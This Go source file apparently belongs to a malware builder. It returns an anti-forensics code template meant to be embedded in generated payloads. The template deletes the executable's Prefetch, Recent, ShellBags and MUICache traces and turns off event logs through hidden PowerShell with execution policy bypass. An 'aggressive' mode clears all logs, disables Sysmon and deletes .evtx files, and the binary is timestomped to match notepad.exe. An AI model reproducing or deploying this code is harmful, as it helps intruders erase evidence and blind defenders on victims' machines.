package buildergen

import "strings"

func templateAntiForensics() string {
	return strings.TrimSpace(`
func cleanPrefetch() {
	prefetchDir := filepath.Join(os.Getenv("SystemRoot"), "Prefetch")
	entries, err := os.ReadDir(prefetchDir)
	if err != nil {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exeName := strings.ToUpper(filepath.Base(exePath))
	for _, e := range entries {
		if strings.Contains(strings.ToUpper(e.Name()), strings.TrimSuffix(exeName, ".EXE")) {
			_ = os.Remove(filepath.Join(prefetchDir, e.Name()))
		}
	}
}

func clearRecentItems() {
	recentDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent")
	entries, err := os.ReadDir(recentDir)
	if err != nil {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exeName := strings.ToUpper(strings.TrimSuffix(filepath.Base(exePath), ".exe"))
	for _, e := range entries {
		if strings.Contains(strings.ToUpper(e.Name()), exeName) {
			_ = os.Remove(filepath.Join(recentDir, e.Name()))
		}
	}
}

func disableEventLogging() {
	logNames := []string{
		"Microsoft-Windows-TaskScheduler/Operational",
		"Microsoft-Windows-Services/Diagnostic",
	}
	for _, ln := range logNames {
		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
			"-Command", fmt.Sprintf("wevtutil sl \"%s\" /e:false 2>$null", ln))
		_ = cmd.Run()
	}
}

func performAntiForensics() {
	if !isAdmin() {
		return
	}
	go cleanPrefetch()
	go clearRecentItems()
	go disableEventLogging()
}

func performAntiForensicsAggressive() {
	if !isAdmin() {
		return
	}
	go cleanPrefetch()
	go clearRecentItems()
	go disableEventLogging()

	go func() {
		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
			"-Command", getClearAllLogsCmd())
		_ = cmd.Run()
	}()

	go func() {
		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
			"-Command", getDisableSysmonCmd())
		_ = cmd.Run()
	}()

	go func() {
		time.Sleep(2 * time.Second)
		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
			"-Command", getDeleteEvtxCmd())
		_ = cmd.Run()
	}()
}

func performAntiForensicsNormal() {
	go clearRecentItems()
	exePath, err := os.Executable()
	if err == nil {
		go removeZoneIdentifier(exePath)
		go stampFileToSystem(exePath)
	}
	go cleanShellBags()
	go cleanMUICache()
	if isAdmin() {
		go cleanPrefetch()
		go disableEventLogging()
	}
}

func cleanShellBags() {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regDeleteTree := advapi32.NewProc("RegDeleteTreeW")
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	bagPaths := []string{
		"Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU",
		"Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\Bags",
	}

	for _, p := range bagPaths {
		kp, _ := syscall.UTF16PtrFromString(p)
		var hKey syscall.Handle
		ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(kp)), 0, uintptr(0x20006|0x00010000), uintptr(unsafe.Pointer(&hKey)))
		if ret == 0 {
			regDeleteTree.Call(uintptr(hKey), 0)
			regCloseKey.Call(uintptr(hKey))
		}
	}
}

func cleanMUICache() {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regEnumValue := advapi32.NewProc(getRegEnumValueWName())
	regDeleteValue := advapi32.NewProc("RegDeleteValueW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	muiPath := "Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache"
	kp, _ := syscall.UTF16PtrFromString(muiPath)
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(kp)), 0, uintptr(0x20006|0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return
	}
	defer regCloseKey.Call(uintptr(hKey))

	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exeUpper := strings.ToUpper(filepath.Base(exePath))

	var idx uint32
	for {
		nameBuf := make([]uint16, 512)
		nameLen := uint32(len(nameBuf))
		r, _, _ := regEnumValue.Call(uintptr(hKey), uintptr(idx), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(unsafe.Pointer(&nameLen)), 0, 0, 0, 0)
		if r != 0 {
			break
		}
		valName := syscall.UTF16ToString(nameBuf[:nameLen])
		if strings.Contains(strings.ToUpper(valName), exeUpper) {
			vn, _ := syscall.UTF16PtrFromString(valName)
			regDeleteValue.Call(uintptr(hKey), uintptr(unsafe.Pointer(vn)))
		} else {
			idx++
		}
	}
}

func stampFileToSystem(targetPath string) {
	refPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "notepad.exe")
	info, err := os.Stat(refPath)
	if err != nil {
		return
	}
	_ = os.Chtimes(targetPath, info.ModTime(), info.ModTime())

	dir := filepath.Dir(targetPath)
	_ = os.Chtimes(dir, info.ModTime(), info.ModTime())
}
`)
}
